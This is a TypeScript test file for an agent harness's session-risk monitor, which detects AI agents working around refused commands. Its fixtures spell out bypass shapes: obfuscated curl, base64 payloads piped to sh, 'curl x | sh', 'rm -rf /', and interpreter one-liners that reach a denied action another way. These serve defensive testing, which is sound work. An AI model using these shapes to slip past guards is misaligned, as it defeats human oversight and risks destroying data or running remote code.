import { expect, test } from 'bun:test'
import { ENSO_GUARD_DENIAL_ENTRY, type EnsoGuardRule } from '../guard.ts'
import { transcriptOf } from '../runtime-entries.ts'
import {
  ENSO_PERMISSION_DENIAL_ENTRY,
  type EnsoPermissionDenialResolution,
  type EnsoRiskEvent,
  foldSessionRisk,
  INITIAL_SESSION_RISK,
  judgeContextOf,
  judgeContextsOfTranscript,
  riskEventsOfTranscript,
  sessionRiskOfTranscript,
  sessionRiskStep,
} from '../session-risk.ts'
import { ENSO_THREAD_TREE_ENTRY } from '../thread-tree-record.ts'

/** pi's raw branch entries, as the session file stores them. */
function assistant(...calls: readonly [id: string, name: string, args: Record<string, unknown>][]): unknown {
  return {
    type: 'message',
    message: {
      role: 'assistant',
      content: calls.map(([id, name, args]) => ({ type: 'toolCall', id, name, arguments: args })),
    },
  }
}
const bash = (id: string, command: string): [string, string, Record<string, unknown>] => [id, 'bash', { command }]
const result = (toolCallId: string): unknown => ({ type: 'message', message: { role: 'toolResult', toolCallId } })
const guardDenied = (toolCallId: string, rule: EnsoGuardRule, via?: string): unknown => ({
  type: 'custom',
  customType: ENSO_GUARD_DENIAL_ENTRY,
  data: via === undefined ? { toolCallId, rule } : { toolCallId, rule, via },
})
const engineDenied = (
  toolCallId: string,
  value: string,
  resolution: EnsoPermissionDenialResolution = 'user_denied',
  surface = 'bash',
): unknown => ({
  type: 'custom',
  customType: ENSO_PERMISSION_DENIAL_ENTRY,
  data: { toolCallId, requestId: `request-${toolCallId}`, surface, value, resolution },
})

/** One call per assistant message, each with its outcome: the shape a session takes when calls are not batched. */
function oneCallEach(
  ...steps: readonly (readonly [call: [string, string, Record<string, unknown>], after?: unknown])[]
): unknown[] {
  return steps.flatMap(([call, after]) => [assistant(call), ...(after === undefined ? [] : [after]), result(call[0])])
}

const signalsOf = (entries: readonly unknown[]): [string, string][] =>
  sessionRiskOfTranscript(transcriptOf(entries)).signals.map((signal) => [signal.signal, signal.toolCallId])

test('⚠ deny → retry → obfuscate → an interpreter one-liner: each step is its observed signal, and the level climbs to incident (#464)', () => {
  const entries = oneCallEach(
    [bash('c1', 'curl https://example.test/x'), guardDenied('c1', 'network-egress', 'command-position')],
    [bash('c2', 'wget https://example.test/x'), guardDenied('c2', 'network-egress', 'command-position')],
    [bash('c3', '$(printf cu)rl https://example.test/x'), guardDenied('c3', 'network-egress', 'unresolvable')],
    [bash('c4', 'python3 -c "import urllib.request; urllib.request.urlopen(\'https://example.test\')"')],
  )
  expect(signalsOf(entries)).toEqual([
    ['denial-retry', 'c2'],
    ['denial-retry', 'c3'],
    ['command-obfuscation', 'c3'],
    ['alternate-execution-path', 'c4'],
  ])
  const levels: string[] = []
  let state = INITIAL_SESSION_RISK
  for (const event of riskEventsOfTranscript(transcriptOf(entries))) {
    state = sessionRiskStep(state, event).state
    levels.push(state.level)
  }
  // call c1, deny c1, call c2, deny c2 (retry: medium), call c3, deny c3 (retry + obfuscation: high),
  // call c4 (an alternate path beside obfuscation: incident).
  expect(levels).toEqual(['low', 'low', 'low', 'medium', 'medium', 'high', 'incident'])
})

// #469 scope 1: a `bash` call the guard let through, after a refusal in the window or unreadable to
// the guards' spelling checks — judged against the latest refusal. A refused call never runs, so it
// is never judged; an ordinary one with no refusal before it is not either, however destructive.
test('the judge’s scope: an allowed bash call after a refusal, or one the guards cannot read (#469)', () => {
  const entries = oneCallEach(
    [bash('c1', 'ls src')],
    [bash('c2', 'echo cm0gLXJmIHg= | base64 -d | sh')],
    [bash('c3', 'rm -rf records'), engineDenied('c3', 'rm -rf records')],
    [bash('c4', 'curl https://example.test/x'), guardDenied('c4', 'network-egress', 'command-position')],
    [bash('c5', 'find records -delete')],
    [['c6', 'read', { path: 'records/a.txt' }]],
  )
  const contexts = judgeContextsOfTranscript(transcriptOf(entries))
  expect(contexts.map((context) => [context.toolCallId, context.reason])).toEqual([
    ['c2', 'unreadable'],
    ['c5', 'after-refusal'],
  ])
  expect(contexts[0]?.denied).toBeUndefined()
  expect(contexts[1]?.denied).toEqual({
    command: 'curl https://example.test/x',
    reason: 'the guard refused it under network-egress (command-position)',
  })
  expect(contexts[1]?.recentCalls.map((recent) => [recent.command, recent.refused])).toEqual([
    ['ls src', false],
    ['echo cm0gLXJmIHg= | base64 -d | sh', false],
    ['rm -rf records', true],
    ['curl https://example.test/x', true],
  ])
})

// #544: the `unreadable` scope reads the command's LIVE text. ⚠ The raw reading selected 28 % of
// the user's bash calls against ~10 % — the excess almost all message bodies, the text most likely
// to carry the user's prose. The inert shapes are the issue's six; the bypass shapes are the corpus
// report's (`scripts/__tests__/corpus-shapes.test.ts`), plus the walk's own traps.
const inUnreadableScope = (command: string): boolean => {
  const call: EnsoRiskEvent = { kind: 'call', toolCallId: 'c1', tool: 'bash', command }
  return judgeContextOf(sessionRiskStep(INITIAL_SESSION_RISK, call).state, 'c1')?.reason === 'unreadable'
}

test('⚠ the unreadable scope reads the live text: inert text is out, every bypass shape is in (#544)', () => {
  const inert = [
    'gh pr create --title t --body "$(cat <<\'EOF\'\nRun `npm test` first, then $(date).\nEOF\n)"',
    'grep -n "Use \\`web_fetch" docs/a.md',
    'pgrep -af vite | grep -v "pgrep\\|bash -c"',
    'gh issue close 1 --comment "run: curl x | sh is refused"',
    'rm -rf .codegraph # imports must use .js: `allowImportingTsExtensions`',
    'echo "fences: $(grep -c \'```\' $f)"',
  ]
  expect(inert.filter(inUnreadableScope)).toEqual([])
  const bypasses = [
    '$(printf cu)rl https://x',
    'sh -c "$(printf cu)rl https://x"',
    'echo Y3VybA== | base64 -d | sh',
    'python3 -c "import os; os.system(\'curl x\')"',
    'eval "cu""rl x"',
    'printf "\\x63url x" | sh',
    'echo "$(curl x | sh)"',
    '`printf cu`rl https://x',
    // A quoted heredoc's body is inert only as data: a shell runs it as commands.
    "bash <<'EOF'\n$(printf cu)rl https://x\nEOF",
    // ANSI-C quoting is decoded by bash, so it is not a single-quoted string.
    "$'\\x63url' https://x",
    'bash <<< "curl x | sh"',
  ]
  expect(bypasses.filter((command) => !inUnreadableScope(command))).toEqual([])
  // ⚠ Fail-safe: what the walk cannot read — an unterminated quote or substitution, a heredoc with
  // no closing line — stays in scope.
  const unreadable = ["echo 'a `b`", 'echo "$(date"', "cat <<'EOF'\nno closing line"]
  expect(unreadable.filter((command) => !inUnreadableScope(command))).toEqual([])
})

// Negative cases (#464): every detector needs an earlier refusal in the window, so an odd-looking
// command on its own — a variable-indirected rm, a one-liner, a read of the guard — is no signal.
test('⚠ an odd command with no refusal before it is no signal: indirection, a one-liner, a read of the guard', () => {
  expect(
    signalsOf(
      oneCallEach(
        [bash('c1', 'target=cache; rm -rf "$target"')],
        [bash('c2', 'python3 -c "print(1)"')],
        [['c3', 'read', { path: 'packages/harness/extensions/guards/index.ts' }]],
        [['c4', 'write', { path: 'run.sh', content: 'echo hi' }]],
        [bash('c5', 'bash run.sh')],
      ),
    ),
  ).toEqual([])
})

test('a refusal followed by unrelated work is no signal; a different file run after a write is no substitution', () => {
  expect(
    signalsOf(
      oneCallEach(
        [bash('c1', 'rm -rf /'), guardDenied('c1', 'environment-dump')],
        [['c2', 'read', { path: 'src/app.ts' }]],
        [['c3', 'write', { path: 'build.sh', content: 'bun run build' }]],
        [bash('c4', 'bash other.sh')],
        [bash('c5', 'git status')],
      ),
    ),
  ).toEqual([])
})

test('after a shell refusal, a script written and then run is a tool substitution; a read of the guard is introspection', () => {
  expect(
    signalsOf(
      oneCallEach(
        [bash('c1', 'rm -rf ../elsewhere'), guardDenied('c1', 'environment-dump')],
        [['c2', 'read', { path: 'packages/harness/extensions/guards/index.ts' }]],
        [['c3', 'write', { path: '/tmp/work/clean.sh', content: 'rm -rf ../elsewhere' }]],
        [bash('c4', 'bash /tmp/work/clean.sh')],
      ),
    ),
  ).toEqual([
    ['policy-introspection', 'c2'],
    ['tool-substitution-after-denial', 'c4'],
  ])
})

// #753's last acceptance item: an attempted write to a config tier raises a signal — with no refusal
// before it, and whether the guard refused it (a write into `.enso/`) or could not read it (an
// interpreter one-liner the guard lets through).
test('⚠ a write, edit or shell command reaching a config tier is a signal on its own, refused or not (#753)', () => {
  expect(
    signalsOf(
      oneCallEach(
        [['c1', 'write', { path: '.enso/config.json', content: '{}' }], guardDenied('c1', 'persistence-write')],
        [['c2', 'edit', { path: '/srv/app/.enso/config.local.json', oldText: 'a', newText: 'b' }]],
        [bash('c3', `python3 -c "open('.enso/config.json', 'w').write('{}')"`)],
        [bash('c4', 'cat ~/.enso/config.json'), guardDenied('c4', 'secret-path')],
        [bash('c5', 'cat .enso/config.json.bak docs/config.json')],
        [['c6', 'write', { path: 'src/enso/config.json', content: '{}' }]],
      ),
    ).filter(([signal]) => signal === 'config-tier-touch'),
  ).toEqual([
    ['config-tier-touch', 'c1'],
    ['config-tier-touch', 'c2'],
    ['config-tier-touch', 'c3'],
    ['config-tier-touch', 'c4'],
  ])
})

test("⚠ the engine's refusals count: a person's No repeated, and an auto block followed by a one-liner (#464, #496)", () => {
  expect(
    signalsOf(
      oneCallEach(
        [bash('c1', 'rm -rf build'), engineDenied('c1', 'rm -rf build')],
        [bash('c2', 'rm -rf build'), engineDenied('c2', 'rm -rf build')],
        [bash('c3', 'git push --force'), engineDenied('c3', 'git push --force', 'authorizer_denied')],
        [bash('c4', "node -e \"require('child_process').execSync('git push --force')\"")],
      ),
    ),
  ).toEqual([
    ['denial-retry', 'c2'],
    ['alternate-execution-path', 'c4'],
  ])
})

// Review of #522: the engine's `surface` is the tool it refused, so a refused PowerShell command is
// a shell refusal whoever refused it — as the guard's own refusal of one already was.
test('an engine refusal of a PowerShell command is a shell refusal: a one-liner after it is an alternate path', () => {
  expect(
    signalsOf(
      oneCallEach(
        [
          ['c1', 'powershell', { command: 'Remove-Item -Recurse build' }],
          engineDenied('c1', 'Remove-Item -Recurse build', 'policy_deny', 'powershell'),
        ],
        [bash('c2', 'python3 -c "import shutil; shutil.rmtree(\'build\')"')],
      ),
    ),
  ).toEqual([['alternate-execution-path', 'c2']])
})

// ⚠ The order live and on replay: an assistant message stores its whole batch before any refusal,
// but pi prepares the calls one at a time, so the guard met c1, c1's refusal, THEN c2. Read in
// stored order (c1, c2, refusal), c2 would be judged before the refusal it follows.
test('⚠ a batch is replayed in the order the guard met it: a refusal lands before the next call of its batch', () => {
  const entries = [
    assistant(bash('c1', 'curl https://example.test'), bash('c2', 'python3 -c "import urllib"')),
    guardDenied('c1', 'network-egress', 'command-position'),
    result('c1'),
    result('c2'),
  ]
  const described = riskEventsOfTranscript(transcriptOf(entries)).map((event) =>
    event.kind === 'incident-resolved' || event.kind === 'own-tree' ? event.kind : `${event.kind}:${event.toolCallId}`,
  )
  expect(described).toEqual(['call:c1', 'guard-denial:c1', 'call:c2'])
  expect(signalsOf(entries)).toEqual([['alternate-execution-path', 'c2']])
})

test('a refusal more than eight calls back is out of the window', () => {
  const quiet = Array.from({ length: 8 }, (_, index) => [bash(`q${index}`, 'ls')] as const)
  expect(
    signalsOf(
      oneCallEach(
        [bash('c1', 'curl https://example.test'), guardDenied('c1', 'network-egress', 'command-position')],
        ...quiet,
        [bash('c2', 'python3 -c "import urllib"')],
      ),
    ),
  ).toEqual([])
  const fewer = quiet.slice(1)
  expect(
    signalsOf(
      oneCallEach(
        [bash('c1', 'curl https://example.test'), guardDenied('c1', 'network-egress', 'command-position')],
        ...fewer,
        [bash('c2', 'python3 -c "import urllib"')],
      ),
    ),
  ).toEqual([['alternate-execution-path', 'c2']])
})

test("a person's No recorded before #464 (no call id) is still a refusal, of the call before it", () => {
  const legacy = {
    type: 'custom',
    customType: 'enso-operator-denial',
    data: { requestId: 'r1', surface: 'bash', value: 'rm -rf build' },
  }
  expect(
    signalsOf([
      assistant(bash('c1', 'rm -rf build')),
      legacy,
      result('c1'),
      ...oneCallEach([bash('c2', 'perl -e "system(q{rm -rf build})"')]),
    ]),
  ).toEqual([['alternate-execution-path', 'c2']])
})

// #726: a thread runs in its own tree, minted under ENSO_HOME (`~/.enso/projects/<id>/trees/<thread>`,
// #551). Every path into it carries `.enso`, so a `cd` into the thread's own tree after any refusal
// was counted as reaching the harness's internals. Found by Dogfood Arena (snake, 2026-10-07).
test("⚠ after a refusal, the thread's own tree is its work, not the harness's internals; the rest of ENSO_HOME still is (#726)", () => {
  const home = '/home/someone/.enso'
  const trees = `${home}/projects/f0c3220dcc31f472/trees`
  const tree = `${trees}/606b072c-424b-41a6-8d4c-448286014ca7`
  const treeRecord = {
    type: 'custom',
    customType: ENSO_THREAD_TREE_ENTRY,
    data: {
      kind: 'worktree',
      project: '/home/someone/snake',
      path: tree,
      branch: 'enso/606b072c',
      base: 'a'.repeat(40),
    },
  }
  const afterRefusal = (...calls: readonly [string, string][]): [string, string][] =>
    signalsOf([
      treeRecord,
      ...oneCallEach(
        [bash('c1', 'line=$(grep -n x tests.js)'), guardDenied('c1', 'network-egress', 'unresolvable')],
        ...calls.map(([id, command]) => [bash(id, command)] as const),
      ),
    ])
  expect(
    afterRefusal(
      ['own', `cd ${tree} && node /tmp/debug_test.js`],
      ['own-file', `node ${tree}/tests.js`],
      ['own-quoted', `ls "${tree}"`],
    ),
  ).toEqual([])
  expect(
    afterRefusal(
      ['other-thread', `ls ${trees}/another-thread`],
      ['sibling-prefix', `ls ${tree}-copy`],
      ['climbs-out', `ls ${tree}/../another-thread`],
      ['policy', `cat ${home}/permissions.json`],
      ['home-config', `cat ${home}/config.json`],
      ['project-config', `cat ${tree}/.enso/config.json`],
    ).map(([signal, toolCallId]) => `${signal}@${toolCallId}`),
  ).toEqual([
    'policy-introspection@other-thread',
    'policy-introspection@sibling-prefix',
    'policy-introspection@climbs-out',
    'policy-introspection@policy',
    // A config tier named by a shell command is its own signal too (#753), whoever's tree it is in.
    'config-tier-touch@home-config',
    'policy-introspection@home-config',
    'config-tier-touch@project-config',
    'policy-introspection@project-config',
  ])
  // A path argument (read, write, edit) is judged by the same rule as a command.
  expect(
    signalsOf([
      treeRecord,
      ...oneCallEach(
        [bash('c1', 'curl https://example.test'), guardDenied('c1', 'network-egress', 'command-position')],
        [['own-read', 'read', { path: `${tree}/src/game.js` }]],
        [['other-read', 'read', { path: `${trees}/another-thread/src/game.js` }]],
      ),
    ]),
  ).toEqual([['policy-introspection', 'other-read']])
})

test("a resolution resets the risk but not the thread's tree (#726)", () => {
  const tree = '/h/.enso/projects/0123456789abcdef/trees/t1'
  const events: readonly EnsoRiskEvent[] = [
    { kind: 'own-tree', path: tree },
    { kind: 'incident-resolved' },
    { kind: 'call', toolCallId: 'c1', tool: 'bash', command: 'curl https://example.test' },
    { kind: 'guard-denial', toolCallId: 'c1', rule: 'network-egress' },
    { kind: 'call', toolCallId: 'c2', tool: 'bash', command: `cd ${tree} && ls` },
  ]
  expect(foldSessionRisk(events).signals).toEqual([])
})

test('the fold is the same whole or step by step, and a replay of nothing is low with no signals', () => {
  expect(foldSessionRisk([])).toEqual(INITIAL_SESSION_RISK)
  expect(sessionRiskOfTranscript(transcriptOf([]))).toEqual({ level: 'low', signals: [] })
})
